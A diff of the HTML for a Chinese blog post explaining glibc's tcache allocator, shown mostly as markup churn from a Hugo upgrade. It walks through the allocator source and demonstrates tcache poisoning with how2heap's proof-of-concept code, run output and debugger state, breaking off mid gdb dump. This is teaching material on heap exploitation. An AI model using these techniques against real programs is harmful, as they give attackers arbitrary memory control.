@@ -32,7 +32,7 @@
 
 
 
-<meta name="generator" content="Hugo 0.55.2" />
+<meta name="generator" content="Hugo 0.75.1" />
 
 
 <link rel="canonical" href="https://bash-c.github.io/post/dive-into-tcache/" />
@@ -61,16 +61,13 @@
 <meta property="og:description" content="tcache 是 glibc 2.26(ubuntu 17.10) 之后引入的一种技术（see commit），目的是提升堆管理的性能。但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式。" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://bash-c.github.io/post/dive-into-tcache/" />
-<meta property="article:published_time" content="2018-10-14T20:22:25&#43;08:00"/>
-<meta property="article:modified_time" content="2018-10-14T20:22:25&#43;08:00"/>
-
+<meta property="article:published_time" content="2018-10-14T20:22:25+08:00" />
+<meta property="article:modified_time" content="2018-10-14T20:22:25+08:00" />
 <meta itemprop="name" content="Dive Into Tcache">
 <meta itemprop="description" content="tcache 是 glibc 2.26(ubuntu 17.10) 之后引入的一种技术（see commit），目的是提升堆管理的性能。但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式。">
-
-
-<meta itemprop="datePublished" content="2018-10-14T20:22:25&#43;08:00" />
-<meta itemprop="dateModified" content="2018-10-14T20:22:25&#43;08:00" />
-<meta itemprop="wordCount" content="0">
+<meta itemprop="datePublished" content="2018-10-14T20:22:25+08:00" />
+<meta itemprop="dateModified" content="2018-10-14T20:22:25+08:00" />
+<meta itemprop="wordCount" content="10020">
 
 
 
@@ -317,8 +314,8 @@
             <a href="https://bash-c.github.io/categories/how2/"> how2 </a>
             
           </div>
-        <span class="more-meta"> 0 words </span>
-          <span class="more-meta"> 0 min read </span>
+        <span class="more-meta"> 10020 words </span>
+          <span class="more-meta"> 20 min read </span>
 
         
         
@@ -338,32 +335,22 @@
   <h2 class="post-toc-title">Table of Contents</h2>
   <div class="post-toc-content">
     <nav id="TableOfContents">
-<ul>
-<li>
-<ul>
-<li><a href="#new-structure">New Structure</a></li>
-<li><a href="#相关函数">相关函数</a>
-<ul>
-<li><a href="#source-code">source code</a>
-<ul>
-<li><a href="#libc-malloc">__libc_malloc</a></li>
-<li><a href="#tcache-init">__tcache_init()</a></li>
-<li><a href="#申请内存">申请内存</a></li>
-<li><a href="#tcache-get">tcache_get()</a></li>
-<li><a href="#libc-free">__libc_free()</a></li>
-<li><a href="#int-free">_int_free()</a></li>
-<li><a href="#tcache-put">tcache_put()</a></li>
-</ul></li>
-</ul></li>
-<li><a href="#tcache-makes-heap-exploitation-easy-again">tcache makes heap exploitation easy again</a>
-<ul>
-<li><a href="#tcache-poisoning">tcache poisoning</a></li>
-<li><a href="#tcache-dup">tcache dup</a></li>
-<li><a href="#tcache-perthread-corruption">tcache perthread corruption</a></li>
-</ul></li>
-<li><a href="#references-thanks-to">References &amp; thanks to:</a></li>
-</ul></li>
-</ul>
+  <ul>
+    <li><a href="#new-structure">New Structure</a></li>
+    <li><a href="#相关函数">相关函数</a>
+      <ul>
+        <li><a href="#source-code">source code</a></li>
+      </ul>
+    </li>
+    <li><a href="#tcache-makes-heap-exploitation-easy-again">tcache makes heap exploitation easy again</a>
+      <ul>
+        <li><a href="#tcache-poisoning">tcache poisoning</a></li>
+        <li><a href="#tcache-dup">tcache dup</a></li>
+        <li><a href="#tcache-perthread-corruption">tcache perthread corruption</a></li>
+      </ul>
+    </li>
+    <li><a href="#references--thanks-to">References &amp; thanks to:</a></li>
+  </ul>
 </nav>
   </div>
 </div>
@@ -371,21 +358,16 @@
     
     <div class="post-content">
       <p>tcache 是 glibc 2.26(ubuntu 17.10) 之后引入的一种技术（see <a href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc">commit</a>），目的是提升堆管理的性能。但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式。</p>
-
 <blockquote>
 <p>主要参考了 glibc 源码，angelboy 的 slide 以及 tukan.farm，链接都放在最后了。</p>
 </blockquote>
-
 <h2 id="new-structure">New Structure</h2>
-
 <p>tcache 引入了两个新的结构体，<code>tcache_entry</code> 和 <code>tcache_perthread_struct</code>。</p>
-
 <p><strong>tcache_entry</strong></p>
-
 <p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#tcache_entry">source code</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -398,15 +380,14 @@
 <span class="k">typedef</span> <span class="k">struct</span> <span class="n">tcache_entry</span>
 <span class="p">{</span>
   <span class="k">struct</span> <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
-<span class="p">}</span> <span class="n">tcache_entry</span><span class="p">;</span></code></pre></td></tr></table>
+<span class="p">}</span> <span class="n">tcache_entry</span><span class="p">;</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><strong>tcache_perthread_struct</strong></p>
-
+</div><p><strong>tcache_perthread_struct</strong></p>
 <p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#tcache_perthread_struct">source code</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -435,67 +416,55 @@
 
 <span class="cp"># define TCACHE_MAX_BINS                64
 </span><span class="cp"></span>
-<span class="k">static</span> <span class="n">__thread</span> <span class="n">tcache_perthread_struct</span> <span class="o">*</span><span class="n">tcache</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span></code></pre></td></tr></table>
+<span class="k">static</span> <span class="n">__thread</span> <span class="n">tcache_perthread_struct</span> <span class="o">*</span><span class="n">tcache</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<hr />
-
+</div><hr>
 <p>先给一个宏观印象：</p>
-
 <ul>
 <li><code>tcache_prethread_struct</code> 是整个 tcache 的管理结构，其中有 64 项 entries。每个 entries 管理了若干个大小相同的 chunk，用单向链表 (<code>tcache_entry</code>) 的方式连接释放的 chunk，这一点上和 fastbin 很像</li>
 <li>每个 thread 都会维护一个 <code>tcache_prethread_struct</code></li>
 <li><code>tcache_prethread_struct</code> 中的 <code>counts</code> 记录 <code>entries</code> 中每一条链上 chunk 的数目，每条链上最多可以有 7 个 chunk</li>
 <li><code>tcache_entry</code> 用于链接 chunk 结构体，其中的 <code>next</code> 指针指向下一个大小相同的 chunk
-
 <ul>
 <li>这里与 fastbin 不同的是 fastbin 的 fd 指向 chunk 开头的地址，而 tcache 的 next 指向 user data 的地方，即 chunk header 之后</li>
-</ul></li>
 </ul>
-
+</li>
+</ul>
 <p>用图表示大概是：</p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fw87zlnrhtj30nh0ciglz.jpg" alt="" /></p>
-
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fw87zlnrhtj30nh0ciglz.jpg" alt=""></p>
 <h2 id="相关函数">相关函数</h2>
-
 <p>同样先给一个宏观的印象：</p>
-
 <ul>
 <li>第一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_prethread_struct</code></li>
 <li>free 内存，且 size 小于 small bin size 时
-
 <ul>
 <li>tcache 之前会放到 fastbin 或者 unsorted bin 中</li>
 <li>tcache 后：
-
 <ul>
 <li>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）</li>
 <li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li>
 <li>tcache 中的 chunk 不会合并（不取消 inuse bit）</li>
-</ul></li>
-</ul></li>
+</ul>
+</li>
+</ul>
+</li>
 <li>malloc 内存，且 size 在 tcache 范围内
-
 <ul>
 <li>先从 tcache 取 chunk，直到 tcache 为空</li>
 <li>tcache 为空后，从 bin 中找</li>
 <li>tcache 为空时，如果 <code>fastbin/smallbin/unsorted bin</code> 中有 size 符合的 chunk，会先把 <code>fastbin/smallbin/unsorted bin</code> 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li>
-</ul></li>
 </ul>
-
+</li>
+</ul>
 <h3 id="source-code">source code</h3>
-
 <p>接下来从源码的角度分析一下 tcache。</p>
-
-<h4 id="libc-malloc">__libc_malloc</h4>
-
+<h4 id="__libc_malloc">__libc_malloc</h4>
 <p>第一次 malloc 时，会进入到 <code>MAYBE_INIT_TCACHE ()</code></p>
-
 <p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3010">source code</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -550,17 +519,15 @@
 <span class="cp">#endif
 </span><span class="cp"></span>    <span class="p">......</span>
     <span class="p">......</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<h4 id="tcache-init">__tcache_init()</h4>
-
+</div><h4 id="__tcache_init">__tcache_init()</h4>
 <p>其中 <code>MAYBE_INIT_TCACHE ()</code> 在 tcache 为空（即第一次 malloc）时调用了 <code>tcache_init()</code>，直接查看 <code>tcache_init()</code></p>
-
 <p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#tcache_init">source code</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -615,17 +582,15 @@
       <span class="n">tcache</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_perthread_struct</span> <span class="o">*</span><span class="p">)</span> <span class="n">victim</span><span class="p">;</span> <span class="c1">// 更新 tcache
 </span><span class="c1"></span>      <span class="n">memset</span> <span class="p">(</span><span class="n">tcache</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">tcache_perthread_struct</span><span class="p">));</span>
     <span class="p">}</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><code>tcache_init()</code> 成功返回后，<code>tcache_prethread_struct</code> 就被成功建立了</p>
-
+</div><p><code>tcache_init()</code> 成功返回后，<code>tcache_prethread_struct</code> 就被成功建立了</p>
 <h4 id="申请内存">申请内存</h4>
-
 <p>接下来将进入申请内存的步骤</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -643,6 +608,7 @@
 </span><span class="lnt">16
 </span><span class="lnt">17
 </span><span class="lnt">18
+</span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-C" data-lang="C">  <span class="c1">// 从 tcache list 中获取内存
@@ -662,19 +628,17 @@
       <span class="n">assert</span> <span class="p">(</span><span class="o">!</span><span class="n">victim</span> <span class="o">||</span> <span class="n">chunk_is_mmapped</span> <span class="p">(</span><span class="n">mem2chunk</span> <span class="p">(</span><span class="n">victim</span><span class="p">))</span> <span class="o">||</span>
               <span class="o">&amp;</span><span class="n">main_arena</span> <span class="o">==</span> <span class="n">arena_for_chunk</span> <span class="p">(</span><span class="n">mem2chunk</span> <span class="p">(</span><span class="n">victim</span><span class="p">)));</span>
       <span class="k">return</span> <span class="n">victim</span><span class="p">;</span>
-    <span class="p">}</span></code></pre></td></tr></table>
-</div>
-</div>
-<p>在 <code>tcache-&gt;entries</code> 不为空时，将进入 <code>tcache_get()</code> 的流程获取 chunk，否则与 tcache 机制前的流程类似，这里主要分析第一种 <code>tcache_get()</code>。这里也可以看出 tcache 的优先级很高，比 fastbin 还要高（ fastbin 的申请在没进入 tcache 的流程中）。</p>
+    <span class="p">}</span>
 
-<h4 id="tcache-get">tcache_get()</h4>
-
+</code></pre></td></tr></table>
+</div>
+</div><p>在 <code>tcache-&gt;entries</code> 不为空时，将进入 <code>tcache_get()</code> 的流程获取 chunk，否则与 tcache 机制前的流程类似，这里主要分析第一种 <code>tcache_get()</code>。这里也可以看出 tcache 的优先级很高，比 fastbin 还要高（ fastbin 的申请在没进入 tcache 的流程中）。</p>
+<h4 id="tcache_get">tcache_get()</h4>
 <p>看一下 <code>tcache_get()</code></p>
-
 <p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#tcache_get">source code</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -699,19 +663,16 @@
   <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
   <span class="o">--</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span> <span class="c1">// 获得一个 chunk，counts 减一
 </span><span class="c1"></span>  <span class="k">return</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">e</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><code>tcache_get()</code> 就是获得 chunk 的过程了。可以看出这个过程还是很简单的，从 <code>tcache-&gt;entries[tc_idx]</code> 中获得第一个 chunk，<code>tcache-&gt;counts</code> 减一，几乎没有任何保护。</p>
-
-<h4 id="libc-free">__libc_free()</h4>
-
+</div><p><code>tcache_get()</code> 就是获得 chunk 的过程了。可以看出这个过程还是很简单的，从 <code>tcache-&gt;entries[tc_idx]</code> 中获得第一个 chunk，<code>tcache-&gt;counts</code> 减一，几乎没有任何保护。</p>
+<h4 id="__libc_free">__libc_free()</h4>
 <p>看完申请，再看看有 tcache 时的释放</p>
-
 <p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3068">source code</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -730,19 +691,16 @@
   <span class="n">MAYBE_INIT_TCACHE</span> <span class="p">();</span>
   <span class="n">ar_ptr</span> <span class="o">=</span> <span class="n">arena_for_chunk</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
   <span class="n">_int_free</span> <span class="p">(</span><span class="n">ar_ptr</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><code>__libc_free()</code> 没有太多变化，<code>MAYBE_INIT_TCACHE ()</code> 在 tcache 不为空失去了作用。</p>
-
-<h4 id="int-free">_int_free()</h4>
-
+</div><p><code>__libc_free()</code> 没有太多变化，<code>MAYBE_INIT_TCACHE ()</code> 在 tcache 不为空失去了作用。</p>
+<h4 id="_int_free">_int_free()</h4>
 <p>跟进 <code>_int_free()</code></p>
-
 <p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#4123">source code</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -781,17 +739,15 @@
   <span class="p">}</span>
 <span class="cp">#endif
 </span><span class="cp"></span>  <span class="p">......</span>
-  <span class="p">......</span></code></pre></td></tr></table>
+  <span class="p">......</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>判断 <code>tc_idx</code> 合法，<code>tcache-&gt;counts[tc_idx]</code> 在 7 个以内时，就进入 <code>tcache_put()</code>，传递的两个参数是要释放的 chunk 和该 chunk 对应的 size 在 tcache 中的下标。</p>
-
-<h4 id="tcache-put">tcache_put()</h4>
-
+</div><p>判断 <code>tc_idx</code> 合法，<code>tcache-&gt;counts[tc_idx]</code> 在 7 个以内时，就进入 <code>tcache_put()</code>，传递的两个参数是要释放的 chunk 和该 chunk 对应的 size 在 tcache 中的下标。</p>
+<h4 id="tcache_put">tcache_put()</h4>
 <p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#2907">source code</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -814,17 +770,15 @@
   <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
   <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span>
   <span class="o">++</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><code>tcache_puts()</code> 完成了把释放的 chunk 插入到 <code>tcache-&gt;entries[tc_idx]</code> 链表头部的操作，也几乎没有任何保护。并且 <strong>没有把 p 位置零</strong>。</p>
-
+</div><p><code>tcache_puts()</code> 完成了把释放的 chunk 插入到 <code>tcache-&gt;entries[tc_idx]</code> 链表头部的操作，也几乎没有任何保护。并且 <strong>没有把 p 位置零</strong>。</p>
 <h2 id="tcache-makes-heap-exploitation-easy-again">tcache makes heap exploitation easy again</h2>
-
 <p>再复习一遍 <code>tcache_get()</code> 的源码</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -845,21 +799,17 @@
   <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
   <span class="o">--</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
   <span class="k">return</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">e</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>可以发现 <code>tcache_get()</code> 获取 chunk 的安全检查非常少（对 <code>tc_idx</code> 的检测可以忽略），可以说几乎没有任何检查，因此各种利用方式在有 tcache 时利用步骤也大大简化了。</p>
-
+</div><p>可以发现 <code>tcache_get()</code> 获取 chunk 的安全检查非常少（对 <code>tc_idx</code> 的检测可以忽略），可以说几乎没有任何检查，因此各种利用方式在有 tcache 时利用步骤也大大简化了。</p>
 <h3 id="tcache-poisoning">tcache poisoning</h3>
-
 <p>通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。</p>
-
 <p>以 how2heap 中的 <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c">tcache_poisoning</a> 为例</p>
-
 <p>看一下源码</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -908,16 +858,16 @@
 <span class="err">───────┬─────────────────────────────────────────────────────────────────────────────────</span>
        <span class="err">│</span> <span class="nl">File</span><span class="p">:</span> <span class="n">tcache_poisoning</span><span class="p">.</span><span class="n">c</span>
 <span class="err">───────┼─────────────────────────────────────────────────────────────────────────────────</span>
-   <span class="mi">1</span>   <span class="err">│</span> <span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp"></span>   <span class="mi">2</span>   <span class="err">│</span> <span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span><span class="cp"></span>   <span class="mi">3</span>   <span class="err">│</span> <span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
-</span><span class="cp"></span>   <span class="mi">4</span>   <span class="err">│</span> 
+   <span class="mi">1</span>   <span class="err">│</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
+   <span class="mi">2</span>   <span class="err">│</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
+   <span class="mi">3</span>   <span class="err">│</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdint</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
+   <span class="mi">4</span>   <span class="err">│</span> 
    <span class="mi">5</span>   <span class="err">│</span> <span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
    <span class="mi">6</span>   <span class="err">│</span> <span class="p">{</span>
-   <span class="mi">7</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;This file demonstrates a simple tcache poisoning attack</span><span class="err">
-</span><span class="err"></span><span class="s">       │  by tricking malloc into</span><span class="se">\n</span><span class="s">&#34;</span>
-   <span class="mi">8</span>   <span class="err">│</span>                <span class="s">&#34;returning a pointer to an arbitrary location (in this case, the </span><span class="err">
-</span><span class="err"></span><span class="s">       │ stack).</span><span class="se">\n</span><span class="s">&#34;</span>
+   <span class="mi">7</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;This file demonstrates a simple tcache poisoning attack</span>
+       <span class="err">│</span>  <span class="n">by</span> <span class="n">tricking</span> <span class="n">malloc</span> <span class="n">into</span><span class="err">\</span><span class="n">n</span><span class="s">&#34;</span>
+   <span class="mi">8</span>   <span class="err">│</span>                <span class="s">&#34;returning a pointer to an arbitrary location (in this case, the </span>
+       <span class="err">│</span> <span class="n">stack</span><span class="p">).</span><span class="err">\</span><span class="n">n</span><span class="s">&#34;</span>
    <span class="mi">9</span>   <span class="err">│</span>                <span class="s">&#34;The attack is very similar to fastbin corruption attack.</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
   <span class="mi">10</span>   <span class="err">│</span> 
   <span class="mi">11</span>   <span class="err">│</span>         <span class="n">size_t</span> <span class="n">stack_var</span><span class="p">;</span>
@@ -931,8 +881,8 @@
   <span class="mi">18</span>   <span class="err">│</span>         <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
   <span class="mi">19</span>   <span class="err">│</span> 
   <span class="mi">20</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Now the tcache list has [ %p ].</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
-  <span class="mi">21</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;We overwrite the first %lu bytes (fd/next pointer) of t</span><span class="err">
-</span><span class="err"></span><span class="s">       │ he data at %p</span><span class="se">\n</span><span class="s">&#34;</span>
+  <span class="mi">21</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;We overwrite the first %lu bytes (fd/next pointer) of t</span>
+       <span class="err">│</span> <span class="n">he</span> <span class="n">data</span> <span class="n">at</span> <span class="o">%</span><span class="n">p</span><span class="err">\</span><span class="n">n</span><span class="s">&#34;</span>
   <span class="mi">22</span>   <span class="err">│</span>                 <span class="s">&#34;to point to the location to control (%p).</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">intptr_t</span><span class="p">),</span>
        <span class="err">│</span>  <span class="n">a</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var</span><span class="p">);</span>
   <span class="mi">23</span>   <span class="err">│</span>         <span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">intptr_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack_var</span><span class="p">;</span>
@@ -946,13 +896,13 @@
   <span class="mi">31</span>   <span class="err">│</span> 
   <span class="mi">32</span>   <span class="err">│</span>         <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
   <span class="mi">33</span>   <span class="err">│</span> <span class="p">}</span>
-<span class="err">───────┴─────────────────────────────────────────────────────────────────────────────────</span></code></pre></td></tr></table>
+<span class="err">───────┴─────────────────────────────────────────────────────────────────────────────────</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>运行结果是</p>
+</div><p>运行结果是</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -977,21 +927,21 @@ The attack is very similar to fastbin corruption attack.
 
 The address we want malloc<span class="o">()</span> to <span class="k">return</span> is 0x7fff0d28a0c8.
 Allocating <span class="m">1</span> buffer.
-malloc<span class="o">(</span><span class="m">128</span><span class="o">)</span>: 0x55f666ee1260
+malloc<span class="o">(</span>128<span class="o">)</span>: 0x55f666ee1260
 Freeing the buffer...
 Now the tcache list has <span class="o">[</span> 0x55f666ee1260 <span class="o">]</span>.
 We overwrite the first <span class="m">8</span> bytes <span class="o">(</span>fd/next pointer<span class="o">)</span> of the data at 0x55f666ee1260
 to point to the location to control <span class="o">(</span>0x7fff0d28a0c8<span class="o">)</span>.
-1st malloc<span class="o">(</span><span class="m">128</span><span class="o">)</span>: 0x55f666ee1260
+1st malloc<span class="o">(</span>128<span class="o">)</span>: 0x55f666ee1260
 Now the tcache list has <span class="o">[</span> 0x7fff0d28a0c8 <span class="o">]</span>.
-2st malloc<span class="o">(</span><span class="m">128</span><span class="o">)</span>: 0x7fff0d28a0c8
-We got the control</code></pre></td></tr></table>
+2st malloc<span class="o">(</span>128<span class="o">)</span>: 0x7fff0d28a0c8
+We got the control
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>分析一下，程序先申请了一个大小是 128 的 chunk，然后 free。128 在 tcache 的范围内，因此 free 之后该 chunk 被放到了 tcache 中，调试如下：</p>
+</div><p>分析一下，程序先申请了一个大小是 128 的 chunk，然后 free。128 在 tcache 的范围内，因此 free 之后该 chunk 被放到了 tcache 中，调试如下：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1188,15 +1138,14 @@ We got the control</code></pre></td></tr></table>
 <span class="nf">$3</span> <span class="err">=</span> <span class="err">{</span>
   <span class="nf">counts</span> <span class="err">=</span> <span class="err">&#34;\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">001</span><span class="err">&#34;</span><span class="p">,</span> <span class="err">&#39;\</span><span class="mi">000</span><span class="err">&#39;</span> <span class="err">&lt;</span><span class="no">repeats</span> <span class="mi">55</span> <span class="no">times</span><span class="err">&gt;</span><span class="p">,</span>
